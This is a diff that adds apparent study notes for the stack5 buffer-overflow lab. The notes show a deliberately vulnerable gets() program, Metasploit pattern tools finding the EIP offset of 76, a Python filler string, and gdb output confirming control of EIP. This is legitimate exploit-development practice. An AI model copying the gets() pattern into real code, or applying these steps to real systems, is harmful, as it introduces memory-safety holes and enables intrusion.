@@ -1,0 +1,53 @@
+
+https://www.win.tue.nl/~aeb/linux/hh/phrack/P49-14
+
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+
+
+┌──(kali㉿kali)-[~]
+└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb  -l 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+(gdb) r
+Starting program: /home/user/stack5 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
+
+                                                                    
+┌──(kali㉿kali)-[~]
+└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
+[*] Exact match at offset 76
+
+
+
+import struct
+
+buffer = "A"*76 + "B"*4
+
+print buffer
+
+
+(gdb) r < input
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/stack5 < input
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+
+(gdb) p getchar
+$1 = {int (void)} 0xb7ef6570 <getchar>
